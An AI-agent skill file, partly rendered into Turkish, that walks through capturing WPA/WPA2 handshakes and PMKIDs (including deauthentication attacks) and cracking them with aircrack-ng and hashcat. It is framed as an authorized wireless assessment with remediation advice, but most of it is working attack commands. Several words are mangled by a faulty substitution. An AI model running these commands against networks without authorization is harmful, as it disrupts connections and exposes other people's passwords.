---
name: performing-wifi-password-cracking-with-aircrack
description: Captures WPA/WPA2 handshakes and performs offline password cracking using aircrack-ng, hashcat, and dictionary attacks during authorized wireless security assessments to evaluate passphrase
  strength and wireless network security posture.
tags:
- wpa2
- wireless-security
- network-security
- wifi
- fetih
- cybersecurity
- aircrack-ng
- siber-güvenlik
triggers:
- IDS
- IPS
- aircrack
- authentication
- ağ güvenliği
- cracking
- encryption
- firewall
- hash
- network
- network security
- password
category: network-security
source_subdomain: network-security
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
adapted_for: fetih
---

# Performing Wifi Password Cracking with Aircrack


## Ne Zaman Kullanılır

- Assessing the strength of WPA/WPA2/WPA3 passphrases during authorized wireless penetration tests
- Testing whether wireless networks are using weak or default passwords that can be cracked offline
- Capturing and analyzing 4-way handshakes to evaluate wireless authentication security
- Demonstrating the risks of WEP, weak WPA2 passphrases, and PMKID-based attacks to stakeholders
- Validating that enterprise wireless networks use 802.1X/EAP instead of pre-shared keys

**Kullanma:** against wireless networks without explicit written authorization, for disrupting wireless communications, or for capturing handshakes of networks you do not have permission to test.

## Ön Gereksinimler

- Written authorization specifying in-scope SSIDs and wireless networks
- Wireless adapter with monitor mode and packet injection support (Alfa AWUS036ACH, Alfa AWUS036ACM, or similar)
- Kali Linux with aircrack-ng suite, hashcat, and hcxtools installed
- Password wordlists (rockyou.txt, SecLists, or custom organization-specific lists)
- GPU-capable system for hashcat acceleration (optional but recommended for large wordlists)

## İş Akışı

### Adım 1: Prepare the Wireless Interface

```bash
iwconfig
iw dev

sudo airmon-ng check kill

sudo airmon-ng start wlan0

iwconfig wlan0mon

sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### Adım 2: Scan for Target Networks

```bash
sudo airodump-ng wlan0mon


sudo airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w capture
```

### Adım 3: Capture the WPA2 4-Way Handshake

```bash
sudo airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w handshake_capture

sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_capture.pcapng \
  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

hcxpcapngtool -o pmkid_hash.hc22000 pmkid_capture.pcapng

aircrack-ng handshake_capture-01.cap

cowpatty -r handshake_capture-01.cap -c
```

### Adım 4: Crack with Aircrack-ng (CPU-based)

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap

aircrack-ng -w /usr/share/wordlists/rockyou.txt,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt \
  -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap

aircrack-ng -w /usr/share/wordlists/rockyou.txt -e "TargetNetwork" handshake_capture-01.cap

```

### Adım 5: Crack with Hashcat (GPU-accelerated)

```bash
hcxpcapngtool -o hashcat_input.hc22000 handshake_capture-01.cap

aircrack-ng handshake_capture-01.cap -j hashcat_input

hashcat -m 22000 hashcat_input.hc22000 /usr/share/wordlists/rockyou.txt

hashcat -m 22000 hashcat_input.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

hashcat -m 22000 hashcat_input.hc22000 -a 3 ?d?d?d?d?d?d?d?d

hashcat -m 22000 hashcat_input.hc22000 -a 1 wordlist1.txt wordlist2.txt

hashcat -m 22000 hashcat_input.hc22000 -a 3 -1 ?l?u ?1?1?1?1?1?d?d?d?d

hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt

hashcat -m 22000 hashcat_input.hc22000 --show
```

### Adım 6: Document and Clean Up

```bash
sudo airmon-ng stop wlan0mon

sudo systemctl restart NetworkManager

cat > wifi_assessment_report.txt << 'EOF'
WiFi Security Assessment Results
=================================
Target SSID: TargetNetwork
BSSID: AA:BB:CC:DD:EE:FF
Encryption: WPA2-PSK (CCMP)
Channel: 6

Handshake Capture: Successful (Method: Client deauthentication)
Cracking Result: PASSWORD FOUND
Password: [documented securely]
Time to Crack: 3 minutes 47 seconds (rockyou.txt, hashcat GPU)

Recommendation: Change to a passphrase of 15+ characters with mixed case,
numbers, and symbols, or migrate to WPA2/WPA3-Enterprise with 802.1X.
EOF

sha256sum handshake_capture-01.cap > evidence_hashes.txt
```

## Key Concepts

| Term | Definition |
|------|------------|
| **4-Way Handshake** | WPA/WPA2 authentication exchange between client and AP that derives session keys from the PSK, captured for offline password cracking |
| **PMKID** | Pairwise Master Key Identifier included in the first EAPOL frame from the AP, allowing password cracking without capturing the full handshake or requiring a connected client |
| **Monitor Mode** | Wireless interface mode that captures all wireless frames on a channel without associating with any access point |
| **Deauthentication Attack** | Sending forged 802.11 management frames to disconnect a client from the AP, forcing a reconnection that generates a capturable handshake |
| **PSK (Pre-Shared Key)** | Static password used by all users to authenticate to a WPA/WPA2-Personal network, vulnerable to offline dictionary attacks |
| **802.1X/EAP** | Enterprise wireless authentication using RADIUS that provides per-user credentials, eliminating the shared password vulnerability |

## Tools & Systems

- **aircrack-ng suite**: Comprehensive wireless security toolkit including airodump-ng (capture), aireplay-ng (injection), and aircrack-ng (cracking)
- **hashcat**: GPU-accelerated password cracker supporting WPA/WPA2 handshakes (mode 22000) with dictionary, rule, and mask attacks
- **hcxtools**: Tools for capturing PMKID and converting wireless captures to hashcat-compatible formats
- **hcxdumptool**: Capture tool specifically designed for PMKID extraction without requiring client deauthentication
- **cowpatty**: WPA/WPA2 cracking tool with precomputed hash table support for faster dictionary attacks

## Common Scenarios

### Scenario: Wireless Penetration Test for a Corporate Office

**Context**: A financial services company wants to assess the security of their wireless networks. They have three SSIDs: Corp-WiFi (WPA2-Enterprise for employees), Guest-WiFi (WPA2-PSK for visitors), and IoT-WiFi (WPA2-PSK for IoT devices). The assessment is authorized to test all three networks.

**Approach**:
1. Scan for all three SSIDs and the tespit et:ir BSSIDs, channels, and encryption types
2. Şunu doğrula: Corp-WiFi uses 802.1X/EAP by examining beacon frames -- confirmed, no PSK to crack
3. Capture the 4-way handshake for Guest-WiFi by deauthenticating a connected device and capturing the reconnection
4. Run hashcat with rockyou.txt against the Guest-WiFi handshake -- password "Welcome2024!" cracked in 47 seconds
5. Capture PMKID from IoT-WiFi access point (no client deauth needed) and crack with hashcat -- password "iot12345" found in 12 seconds
6. Demonstrate that Guest-WiFi and IoT-WiFi passwords are weak and easily crackable
7. Recommend migrating Guest-WiFi to a captive portal with per-session passwords and strengthening IoT-WiFi to a 20+ character passphrase

**Pitfalls**:
- Sending excessive deauth frames that disrupt legitimate wireless users beyond the test scope
- Not using a wireless adapter that supports the target network's frequency band (2.4 GHz vs 5 GHz)
- Attempting to crack WPA3-SAE networks with traditional handshake capture (SAE is resistant to offline attacks)
- Running GPU cracking on shared systems without monitoring temperature and power consumption

## Output Format

```
## Wireless Security Assessment Report

**Assessment Date**: 2024-03-15
**Location**: Corporate Office, Building A

### Network Inventory

| SSID | BSSID | Encryption | Auth | Channel | Crackable |
|------|-------|------------|------|---------|-----------|
| Corp-WiFi | AA:BB:CC:11:22:33 | WPA2 | 802.1X | 36 | N/A (Enterprise) |
| Guest-WiFi | AA:BB:CC:44:55:66 | WPA2 | PSK | 6 | YES - 47 seconds |
| IoT-WiFi | AA:BB:CC:77:88:99 | WPA2 | PSK | 1 | YES - 12 seconds |

### Bul:ings

**Bul:ing 1: Weak Guest-WiFi Password (High)**
- Password: "Welcome2024!" (cracked via dictionary in 47 seconds)
- Present in rockyou.txt top 100,000 entries
- Shared among all visitors with no rotation policy

**Bul:ing 2: Trivial IoT-WiFi Password (Critical)**
- Password: "iot12345" (cracked in 12 seconds)
- Default-pattern password providing Erişim: IoT device network
- No network segmentation between IoT-WiFi and corporate resources

### Öneriler
1. Migrate Guest-WiFi to captive portal with per-session credentials
2. Change IoT-WiFi to 20+ character random passphrase with quarterly rotation
3. Implement network segmentation isolating IoT VLAN from corporate resources
4. Consider WPA3-SAE for PSK networks to prevent offline cracking
5. Enable 802.11w Protected Management Frames to prevent deauth attacks
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 49fc8b04a6da619b
-->

